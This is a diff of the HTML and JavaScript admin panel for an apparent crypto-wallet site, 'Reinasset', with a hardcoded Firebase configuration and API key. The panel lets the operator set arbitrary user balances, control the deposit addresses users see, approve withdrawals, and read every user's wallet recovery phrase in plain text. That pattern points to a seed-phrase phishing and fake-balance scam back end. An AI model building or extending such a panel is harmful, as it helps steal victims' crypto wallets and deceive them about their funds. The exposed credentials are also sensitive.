@@ -1,447 +1,352 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Panel</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel | Reinasset</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --sidebar-width: 260px;
+            --primary: #2f80ed;
+            --bg: #f8f9fb;
+            --text-gray: #64748b;
+            --border: #e2e8f0;
+            --white: #ffffff;
+            --success: #27ae60;
+        }
 
-<style>
-body { margin:0; font-family: Arial, sans-serif; display:flex; background:#f4f7fb; }
+        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); display: flex; height: 100vh; overflow: hidden; }
 
-/* Sidebar */
-.sidebar { width:240px; background:#fff; height:100vh; border-right:1px solid #e6ecf2; padding:15px 0; }
-.sidebar h3 { font-size:12px; color:#9aa5b1; padding:0 20px; margin-bottom:10px; }
-.menu-item { display:flex; align-items:center; padding:12px 20px; color:#5f6c7b; cursor:pointer; border-left:3px solid transparent; font-size:14px; }
-.menu-item:hover { background:#f0f6ff; }
-.menu-item.active { background:#eef5ff; color:#2f80ed; border-left:3px solid #2f80ed; font-weight:600; }
+        /* Sidebar & Navigation */
+        .sidebar { width: var(--sidebar-width); background: var(--white); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding-top: 20px; transition: transform 0.3s ease; z-index: 1000; }
+        .sidebar-title { font-size: 11px; font-weight: 700; color: #94a3b8; padding: 0 25px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        .nav-item { display: flex; align-items: center; padding: 14px 25px; color: var(--text-gray); cursor: pointer; font-size: 14px; transition: all 0.2s; text-decoration: none; border-right: 4px solid transparent; }
+        .nav-item:hover { background: #f1f5f9; color: var(--primary); }
+        .nav-item.active { background: #eff6ff; color: var(--primary); font-weight: 600; border-right-color: var(--primary); }
+        .nav-item span { margin-right: 15px; font-size: 18px; }
 
-/* Main */
-.main { flex:1; padding:30px; }
-.main h2 { color:#2f80ed; margin-bottom:20px; }
+        /* Main Content */
+        .main-content { flex: 1; overflow-y: auto; padding: 30px; padding-top: 70px; }
+        .view-section { display: none; max-width: 1000px; margin: 0 auto; }
+        .view-section.active { display: block; animation: fadeIn 0.3s ease; }
 
-/* Card */
-.card { background:#fff; border-radius:10px; padding:20px; margin-bottom:20px; border:1px solid #e6ecf2; max-width:420px; }
+        /* UI Cards & Tables */
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 20px; }
+        .card { background: var(--white); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.02); }
+        .card label { display: block; font-size: 11px; font-weight: 600; color: var(--text-gray); margin-bottom: 8px; text-transform: uppercase; }
+        .card input { width: 100%; padding: 10px; border: 1px solid var(--border); border-radius: 8px; outline: none; box-sizing: border-box; }
 
-.card b { display:block; margin-bottom:15px; font-size:16px; }
+        .table-container { background: var(--white); border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; min-width: 600px; }
+        th { text-align: left; padding: 15px; background: #f8fafc; font-size: 12px; color: var(--text-gray); border-bottom: 1px solid var(--border); }
+        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 14px; }
 
-/* Form group */
-.form-group { margin-bottom:15px; }
-.form-group label {
-  display:block;
-  font-size:13px;
-  color:#6b7785;
-  margin-bottom:6px;
-}
+        /* Buttons */
+        .btn { padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; font-size: 13px; transition: 0.2s; }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-success { background: var(--success); color: white; }
+        .btn-sm { padding: 6px 12px; font-size: 11px; }
 
-.form-group input {
-  width:100%;
-  padding:10px;
-  border-radius:6px;
-  border:1px solid #dfe6ee;
-  background:#f9fbfd;
-  font-size:14px;
-  outline:none;
-  transition:0.2s;
-}
+        /* Mobile Menu */
+        .menu-toggle { display: none; position: fixed; top: 15px; left: 15px; z-index: 1001; background: var(--primary); color: white; border: none; padding: 10px 15px; border-radius: 6px; }
 
-.form-group input:focus {
-  border-color:#2f80ed;
-  background:#fff;
-}
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-/* Button */
-button {
-  width:100%;
-  padding:10px;
-  background:#2f80ed;
-  color:#fff;
-  border:none;
-  border-radius:6px;
-  font-size:14px;
-  cursor:pointer;
-  transition:0.2s;
-}
-button:hover { background:#1c60c4; }
-
-</style>
-<style>
-/* New Table Styles */
-.user-table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-.user-table th, .user-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #e6ecf2; }
-.user-table th { background: #f8f9fa; color: #9aa5b1; font-size: 12px; text-transform: uppercase; }
-.edit-link { color: #2f80ed; cursor: pointer; font-weight: 600; text-decoration: none; }
-
-/* Modal Styles */
-.modal { display:none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; }
-.modal-content { background: #fff; padding: 25px; border-radius: 12px; width: 90%; max-width: 500px; max-height: 80vh; overflow-y: auto; position: relative; }
-.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-.close-modal { font-size: 24px; cursor: pointer; color: #9aa5b1; }
-.grid-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-
-/* Search Bar */
-.search-box { margin-bottom: 20px; padding: 10px; width: 300px; border-radius: 6px; border: 1px solid #dfe6ee; outline: none; }
-</style>
+        @media (max-width: 768px) {
+            .menu-toggle { display: block; }
+            .sidebar { position: fixed; height: 100vh; transform: translateX(-100%); }
+            .sidebar.open { transform: translateX(0); }
+            .card-grid { grid-template-columns: 1fr; }
+        }
+    </style>
 </head>
-
 <body>
 
+    <button class="menu-toggle" onclick="toggleSidebar()">☰ Menu</button>
+    <div id="overlay" onclick="toggleSidebar()" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.3); z-index:999;"></div>
 
-<div class="sidebar">
-  <h3>NAVIGATION</h3>
-  <div class="menu-item active" id="usersBtn">👤 Users</div>
-  <div class="menu-item" id="walletSettingsBtn">💳 Wallet Addresses</div> 
-</div>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-title">Reinasset Admin</div>
+        <div class="nav-item active" onclick="switchView('dashboard')"><span>📊</span> Dashboard</div>
+        <div class="nav-item" onclick="switchView('users')"><span>👥</span> Users</div>
+        <div class="nav-item" onclick="switchView('transactions')"><span>💵</span> Transactions</div>
+        <div class="nav-item" onclick="switchView('phrases')"><span>🔑</span> View User Phrase</div>
+        <div class="nav-item" onclick="switchView('wallets')"><span>💳</span> Wallets</div>
+        <div class="nav-item" style="margin-top:auto; color:#e11d48;" onclick="handleLogout()"><span>🚪</span> Logout</div>
+    </aside>
 
-<div class="main" id="content">
-  <h2>Dashboard</h2>
-</div>
-
-<div id="editModal" class="modal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h3 id="modalUserName">Edit Wallet</h3>
-      <span class="close-modal" id="closeModal">&times;</span>
-    </div>
-    <div id="modalInputs" class="grid-inputs">
-      </div>
-    <br>
-    <button id="saveWalletBtn">Save Changes</button>
-  </div>
-</div>
-
-<div id="viewPhraseModal" class="modal">
-  <div class="modal-content">
-    <div class="modal-header">
-      <h3 id="phraseModalTitle">Connected Wallet Info</h3>
-      <span class="close-modal" id="closePhraseModal">&times;</span>
-    </div>
-    <div class="form-group">
-      <label>Wallet Provider</label>
-      <input type="text" id="displayWalletType" readonly style="font-weight:bold; color:#2f80ed;">
-    </div>
-    <div class="form-group">
-      <label>User Message / Recovery Phrase</label>
-      <textarea id="displayPhrase" readonly 
-        style="width:100%; height:120px; padding:12px; border-radius:6px; border:1px solid #dfe6ee; 
-        background:#fdfdfd; font-weight:900; color:#000; font-family:monospace; resize:none;"></textarea>
-    </div>
-    <button onclick="document.getElementById('viewPhraseModal').style.display='none'">Close View</button>
-  </div>
-</div>
-
-<!-- Firebase (no module, no auth/security) -->
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
-
-<script>
-const firebaseConfig = {
-  apiKey: "AIzaSyAxm4GyDY2RSJXUI1iFpIHUGiPfiEQX9l8",
-  authDomain: "cryptwallet360.firebaseapp.com",
-  databaseURL: "https://cryptwallet360-default-rtdb.firebaseio.com",
-  projectId: "cryptwallet360",
-  storageBucket: "cryptwallet360.firebasestorage.app",
-  messagingSenderId: "464447906680",
-  appId: "1:464447906680:web:471b3482cf21557437de8d"
-};
-
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
-const content = document.getElementById('content');
-
-function setActive(el){
-  document.querySelectorAll('.menu-item').forEach(i=>i.classList.remove('active'));
-  el.classList.add('active');
-}
-
-
-let currentEditingId = null;
-
-function loadUsers() {
-  content.innerHTML = `
-    <h2>Users Management</h2>
-    <input type="text" id="userSearch" class="search-box" placeholder="Search user by name...">
-    <table class="user-table">
-      <thead>
-        <tr>
-          <th>Name</th>
-          <th>Total Coins</th>
-          <th>Status</th>
-          <th>Action</th>
-        </tr>
-      </thead>
-      <tbody id="userTableBody"></tbody>
-    </table>
-  `;
-
-  const tableBody = document.getElementById('userTableBody');
-
-  db.ref('users').on('value', snapshot => {
-    tableBody.innerHTML = '';
-    snapshot.forEach(child => {
-      const user = child.val();
-      const id = child.key;
-      const wallet = user.wallet || {};
-      const coinCount = Object.keys(wallet).length;
-
-      const tr = document.createElement('tr');
-      tr.innerHTML = `
-        <td><b>${user.name || 'Unknown'}</b><br><small style="color:#9aa5b1">${id}</small></td>
-        <td>${coinCount} Assets</td>
-        <td><span style="color:green">● Active</span></td>
-        <td><span class="edit-link" onclick="openEditModal('${id}', '${user.name}')">Edit Balances</span></td>
-      `;
-      tableBody.appendChild(tr);
-    });
-  });
-  // Add this inside loadUsers after the tableBody is defined
-  document.getElementById('userSearch').oninput = (e) => {
-      const term = e.target.value.toLowerCase();
-      const rows = tableBody.getElementsByTagName('tr');
-      for (let row of rows) {
-          const name = row.getElementsByTagName('td').innerText.toLowerCase();
-          row.style.display = name.includes(term) ? '' : 'none';
-      }
-  };
-}
-
-window.openEditModal = (id, name) => {
-  currentEditingId = id;
-  document.getElementById('modalUserName').innerText = "Edit " + name;
-  const modalInputs = document.getElementById('modalInputs');
-  
-  // 1. Show loading state
-  modalInputs.innerHTML = '<p style="padding:20px; text-align:center;">Loading balances...</p>';
-  document.getElementById('editModal').style.display = 'flex';
-  
-  // 2. Fetch current data
-  db.ref('users/' + id + '/wallet').once('value', snap => {
-    const w = snap.val() || {};
-    const coins = ['usd', 'btc', 'eth', 'trx', 'sol', 'doge', 'ada', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc'];
-    
-    let htmlContent = '';
-    coins.forEach(c => {
-      // Create a cleaner label for the Admin UI
-      let displayLabel = c.toUpperCase().replace('_', ' (').replace('trc', 'TRC20)').replace('erc', 'ERC20)');
-      
-      htmlContent += `
-        <div class="form-group" style="margin-bottom: 12px;">
-          <label style="display:block; font-size:12px; font-weight:bold; color:#666; margin-bottom:4px;">
-            ${displayLabel}
-          </label>
-          <input type="number" id="mod-${c}" value="${w[c] || 0}" step="any" 
-                 style="width:100%; padding:8px; border:1px solid #ccc; border-radius:4px;">
-        </div>
-      `;
-    });
-    
-    // 3. Render all inputs at once
-    modalInputs.innerHTML = htmlContent;
-  });
-};
-
-window.openConnectModal = () => {
-    const modal = document.getElementById('connectWalletModal');
-    if (modal) {
-        // Reset the phrase field so it's empty for the new entry
-        const phraseInput = document.getElementById('walletPhrase');
-        if (phraseInput) phraseInput.value = "";
+    <main class="main-content">
         
-        modal.style.display = 'flex';
-    } else {
-        console.error("Connect Wallet Modal not found in DOM");
-    }
-};
+        <section id="view-dashboard" class="view-section active">
+            <h1>Admin Dashboard</h1>
+            <p>Welcome back. Select a menu item to begin management.</p>
+        </section>
 
-document.getElementById('saveWalletBtn').onclick = () => {
-  const coins = ['usd', 'btc', 'eth', 'trx', 'sol', 'doge', 'ada', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc'];
-  const updates = {};
-  
-  coins.forEach(c => {
-    const inputEl = document.getElementById('mod-' + c);
-    if (inputEl) {
-      // Use parseFloat to handle decimals correctly for crypto balances
-      const val = parseFloat(inputEl.value);
-      updates[c] = !isNaN(val) ? val : 0;
-    }
-  });
+        <section id="view-users" class="view-section">
+            <h1>Users Management</h1>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>User Name</th>
+                            <th>Email</th>
+                            <th>Total Balance (USD)</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="user-table-body"></tbody>
+                </table>
+            </div>
 
-  db.ref('users/' + currentEditingId + '/wallet').update(updates)
-    .then(() => {
-      showToast('Wallet updated successfully!');
-      document.getElementById('editModal').style.display = 'none';
-      
-      // Optional: Refresh the local user list display so the new balances show up immediately
-      if (typeof fetchUsers === 'function') fetchUsers(); 
-    })
-    .catch((error) => {
-      console.error("Update failed:", error);
-      showToast('Error updating wallet', 'error');
-    });
-};
+            <div id="balance-editor" style="display:none; margin-top: 40px; border-top: 2px solid var(--border); padding-top: 20px;">
+                <h2 id="editing-user-name">Edit Balance</h2>
+                <div class="card-grid" id="user-balance-grid"></div>
+                <button class="btn btn-primary" style="margin-top:20px" onclick="saveUserBalances()">Update All Assets</button>
+            </div>
+        </section>
 
-document.getElementById('closeModal').onclick = () => {
-  document.getElementById('editModal').style.display = 'none';
-};
-function showToast(msg){
-  const t = document.createElement('div');
-  t.innerText = msg;
-  t.style.position='fixed';
-  t.style.bottom='20px';
-  t.style.right='20px';
-  t.style.background='#2f80ed';
-  t.style.color='#fff';
-  t.style.padding='10px 15px';
-  t.style.borderRadius='6px';
-  document.body.appendChild(t);
-  setTimeout(()=>t.remove(),2000);
-}
+        <section id="view-transactions" class="view-section">
+            <h1>Pending Transactions</h1>
+            <div class="table-container">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>User</th>
+                            <th>Asset</th>
+                            <th>Amount</th>
+                            <th>Recipient Address</th>
+                            <th>Status</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="txn-table-body"></tbody>
+                </table>
+            </div>
+        </section>
 
-// events
+        <section id="view-phrases" class="view-section">
+            <h1>Connected Wallets</h1>
+            <div class="card-grid" id="phrase-card-grid"></div>
+        </section>
 
-document.getElementById('usersBtn').onclick = e=>{ setActive(e.target); loadUsers(); };
+        <section id="view-wallets" class="view-section">
+            <h1>Global Deposit Addresses</h1>
+            <div class="card-grid" id="global-address-grid"></div>
+            <button class="btn btn-primary" style="margin-top:20px" onclick="saveGlobalAddresses()">Save Global Addresses</button>
+        </section>
 
+    </main>
 
-</script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
-<script>
-  // Add to your event listeners at the bottom
-document.getElementById('walletSettingsBtn').onclick = e => { setActive(e.target); loadWalletSettings(); };
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAxm4GyDY2RSJXUI1iFpIHUGiPfiEQX9l8",
+            authDomain: "cryptwallet360.firebaseapp.com",
+            databaseURL: "https://cryptwallet360-default-rtdb.firebaseio.com",
+            projectId: "cryptwallet360",
+            storageBucket: "cryptwallet360.firebasestorage.app"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-function loadWalletSettings() {
-  content.innerHTML = `
-    <h2>Global Deposit Addresses</h2>
-    <div class="card">
-      <div id="walletForm">
-        <p style="font-size:12px; color:#666; margin-bottom:15px;">Set the addresses users see when they click 'Receive'.</p>
-        <div id="addressInputs"></div>
-        <button id="saveGlobalAddresses" style="margin-top:10px;">Save All Addresses</button>
-      </div>
-    </div>
-  `;
+        // App State
+        let state = {
+            activeUserId: null,
+            assetKeys: [ 'btc', 'eth', 'trx', 'sol', 'doge', 'btc', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc']
+        };
 
-  const container = document.getElementById('addressInputs');
-  const coins = ['btc', 'eth', 'trx', 'doge', 'usdt_trc', 'usdt_erc'];
-  
-  // Fetch existing addresses
-  db.ref('settings/deposit_addresses').once('value', snap => {
-    const addrs = snap.val() || {};
-    coins.forEach(c => {
-      container.innerHTML += `
-        <div class="form-group">
-          <label>${c.toUpperCase()} Address</label>
-          <input type="text" id="addr-${c}" value="${addrs[c] || ''}" placeholder="Enter address">
-        </div>
-      `;
-    });
-  });
+        // Navigation Controller
+        function switchView(viewId) {
+            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            
+            document.getElementById('view-' + viewId).classList.add('active');
+            event.currentTarget.classList.add('active');
 
-  document.getElementById('saveGlobalAddresses').onclick = () => {
-    const updates = {};
-    coins.forEach(c => {
-      updates[c] = document.getElementById('addr-' + c).value;
-    });
-    db.ref('settings/deposit_addresses').update(updates).then(() => {
-      showToast('Addresses updated!');
-    });
-  };
-}
-</script>
+            if (viewId === 'users') loadUsers();
+            if (viewId === 'wallets') loadGlobalAddresses();
+            if (viewId === 'phrases') loadPhrases();
+            if (viewId === 'transactions') loadTransactions();
 
-<script>
-  function loadUsers() {
-  content.innerHTML = `
-    <h2>Users Management</h2>
-    <input type="text" id="userSearch" class="search-box" placeholder="Search user by name...">
-    <table class="user-table">
-      <thead>
-        <tr>
-          <th>Name</th>
-          <th>Wallet Info</th> <th>Action</th>
-        </tr>
-      </thead>
-      <tbody id="userTableBody"></tbody>
-    </table>
-  `;
+            if (window.innerWidth <= 768) toggleSidebar();
+        }
 
-  const tableBody = document.getElementById('userTableBody');
+        function toggleSidebar() {
+            document.getElementById('sidebar').classList.toggle('open');
+            document.getElementById('overlay').style.display = 
+                document.getElementById('sidebar').classList.contains('open') ? 'block' : 'none';
+        }
 
-  db.ref('users').on('value', snapshot => {
-    tableBody.innerHTML = '';
-// Update this part inside your loadUsers() function in admin.html
-snapshot.forEach(child => {
-// Inside snapshot.forEach in loadUsers()
-const user = child.val();
-const id = child.key;
+        // --- USERS & BALANCES ---
+        function loadUsers() {
+            const tbody = document.getElementById('user-table-body');
+            db.ref('users').on('value', snap => {
+                tbody.innerHTML = '';
+                snap.forEach(child => {
+                    const u = child.val();
+                    const tr = document.createElement('tr');
+                    tr.innerHTML = `
+                        <td>${u.name || 'User'}</td>
+                        <td>${u.email || 'N/A'}</td>
+                        <td>$${(u.wallet?.usd || 0).toLocaleString()}</td>
+                        <td><button class="btn btn-primary btn-sm" onclick="initBalanceEdit('${child.key}', '${u.name}')">Edit Balances</button></td>
+                    `;
+                    tbody.appendChild(tr);
+                });
+            });
+        }
 
-// Look for connectedWallets (plural)
-const wallets = user.connectedWallets || {};
-const walletCount = Object.keys(wallets).length;
+        function initBalanceEdit(id, name) {
+            state.activeUserId = id;
+            document.getElementById('balance-editor').style.display = 'block';
+            document.getElementById('editing-user-name').innerText = "Updating: " + name;
+            const grid = document.getElementById('user-balance-grid');
+            
+            db.ref(`users/${id}/wallet`).once('value', snap => {
+                const w = snap.val() || {};
+                grid.innerHTML = '';
+                state.assetKeys.forEach(key => {
+                    grid.innerHTML += `
+                        <div class="card">
+                            <label>${key.toUpperCase()}</label>
+                            <input type="number" id="user-inp-${key}" value="${w[key] || 0}" step="any">
+                        </div>`;
+                });
+                grid.scrollIntoView({ behavior: 'smooth' });
+            });
+        }
 
-const tr = document.createElement('tr');
-tr.innerHTML = `
-  <td><b>${user.name || 'Unknown'}</b><br><small>${id}</small></td>
-  <td>
-      ${walletCount > 0 
-        ? `<span class="edit-link" onclick="viewPhrases('${id}')" style="color:#27ae60;">
-            View ${walletCount} Wallet(s)
-           </span>` 
-        : `<span style="color:#9aa5b1">No Connection</span>`
-      }
-  </td>
-  <td><span class="edit-link" onclick="openEditModal('${id}', '${user.name}')">Edit Balances</span></td>
-`;
-  tableBody.appendChild(tr);
+        function saveUserBalances() {
+            const updates = {};
+            state.assetKeys.forEach(key => {
+                updates[key] = parseFloat(document.getElementById('user-inp-' + key).value) || 0;
+            });
+            db.ref(`users/${state.activeUserId}/wallet`).update(updates).then(() => alert("Balances Updated."));
+        }
 
-    });
-  });
-}
+        // --- TRANSACTIONS ---
+// --- TRANSACTIONS ---
 
-// Function to view the connected wallet info
-window.viewPhrases = (id) => {
-    // Note the 's' in connectedWallets to match your new user.js logic
-    db.ref(`users/${id}/connectedWallets`).once('value', snap => {
-        const wallets = snap.val();
-        
-        if (!wallets) {
-            showToast("No wallet data found for this user.");
+// COMPAT SDK VERSION (Admin Side)
+function loadTransactions() {
+    const tbody = document.getElementById('txn-table-body');
+    
+    // Listen to the top-level 'users' node
+    db.ref('users').on('value', snap => {
+        tbody.innerHTML = '';
+        let hasTransactions = false;
+
+        if (!snap.exists()) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:20px;">No users found.</td></tr>';
             return;
         }
-        
-        const displayArea = document.getElementById('displayPhrase');
-        let allWalletsText = "";
 
-        // Convert the object of objects into an array and loop
-        Object.keys(wallets).forEach((key, index) => {
-            const data = wallets[key];
-            const dateStr = new Date(data.timestamp).toLocaleString();
-            
-            allWalletsText += `--- WALLET ENTRY #${index + 1} ---\n`;
-            allWalletsText += `TYPE: ${data.walletType}\n`;
-            allWalletsText += `DATE: ${dateStr}\n`;
-            allWalletsText += `PHRASE/MESSAGE:\n${data.phrase}\n`;
-            allWalletsText += `---------------------------\n\n`;
+        snap.forEach(userChild => {
+            const uid = userChild.key;
+            const userData = userChild.val();
+            const activity = userData.activity;
+
+            if (activity) {
+                hasTransactions = true;
+                // Loop through every transaction in this user's activity
+                Object.keys(activity).forEach(txnId => {
+                    const t = activity[txnId];
+                    const tr = document.createElement('tr');
+                    
+                    const statusColor = t.status === 'success' ? 'var(--success)' : '#f39c12';
+
+                    tr.innerHTML = `
+                        <td>
+                            <div style="font-weight:600;">${userData.name || 'Unknown'}</div>
+                            <small style="color:var(--text-gray); font-size:10px;">UID: ${uid}</small>
+                        </td>
+                        <td>${(t.asset || 'N/A').toUpperCase()}</td>
+                        <td>${t.amount || 0}</td>
+                        <td style="font-family:monospace; font-size:12px;">${t.address || 'N/A'}</td>
+                        <td><span style="color:${statusColor}; font-weight:600;">${t.status || 'pending'}</span></td>
+                        <td>
+                            ${t.status === 'pending' ? 
+                                `<button class="btn btn-success btn-sm" onclick="approveTxn('${txnId}', '${uid}')">Approve</button>` : 
+                                '<span style="color:var(--success)">✓ Approved</span>'}
+                        </td>`;
+                    tbody.appendChild(tr);
+                });
+            }
         });
 
-        // Populate the modal fields
-        document.getElementById('phraseModalTitle').innerText = `Viewing ${Object.keys(wallets).length} Wallet(s)`;
-        document.getElementById('displayWalletType').value = "Multiple Entries";
-        displayArea.value = allWalletsText;
-        
-        // Show the modal
-        document.getElementById('viewPhraseModal').style.display = 'flex';
+        if (!hasTransactions) {
+            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:20px;">No transaction activities found in any user account.</td></tr>';
+        }
     });
-};// Close listener for the new modal
-document.getElementById('closePhraseModal').onclick = () => {
-  document.getElementById('viewPhraseModal').style.display = 'none';
-};
+}
 
-// At the bottom of your script
-document.getElementById('usersBtn').onclick = e => { setActive(e.target); loadUsers(); };
+async function approveTxn(txnId, userId) {
+    if (!confirm("Approve this transaction for this user?")) return;
 
-// Ensure the page loads the Users view by default
-loadUsers();
-setActive(document.getElementById('usersBtn'));
-</script>
+    // Point exactly to the path shown in your screenshot
+    const path = `users/${userId}/activity/${txnId}/status`;
 
+    try {
+        await db.ref(path).set('success');
+        alert("User transaction approved successfully!");
+    } catch (e) {
+        console.error("Update failed:", e);
+        alert("Error: " + e.message);
+    }
+}
+
+function loadPhrases() {
+            const grid = document.getElementById('phrase-card-grid');
+            db.ref('users').once('value', snap => {
+                grid.innerHTML = '';
+                snap.forEach(userChild => {
+                    const wallets = userChild.val().connectedWallets;
+                    if (wallets) {
+                        Object.values(wallets).forEach(w => {
+                            grid.innerHTML += `
+                                <div class="card">
+                                    <label>${w.walletType} (${userChild.val().name})</label>
+                                    <p style="background:#f1f5f9; padding:10px; border-radius:8px; font-family:monospace; font-size:13px; word-break:break-all;">
+                                        ${w.phrase}
+                                    </p>
+                                    <small>${new Date(w.timestamp).toLocaleString()}</small>
+                                </div>`;
+                        });
+                    }
+                });
+            });
+        }
+
+        // --- GLOBAL WALLETS ---
+        function loadGlobalAddresses() {
+            const grid = document.getElementById('global-address-grid');
+            db.ref('settings/deposit_addresses').once('value', snap => {
+                const addrs = snap.val() || {};
+                grid.innerHTML = '';
+                state.assetKeys.slice(1).forEach(key => { // skip 'usd'
+                    grid.innerHTML += `
+                        <div class="card">
+                            <label>${key.toUpperCase()} Global Address</label>
+                            <input type="text" id="global-${key}" value="${addrs[key] || ''}">
+                        </div>`;
+                });
+            });
+        }
+
+        function saveGlobalAddresses() {
+            const updates = {};
+            state.assetKeys.slice(1).forEach(key => {
+                updates[key] = document.getElementById('global-' + key).value;
+            });
+            db.ref('settings/deposit_addresses').update(updates).then(() => alert("Addresses Saved."));
+        }
+
+        function handleLogout() {
+            if(confirm("Logout from Admin?")) window.location.href = "login.html";
+        }
+    </script>
 </body>
 </html>
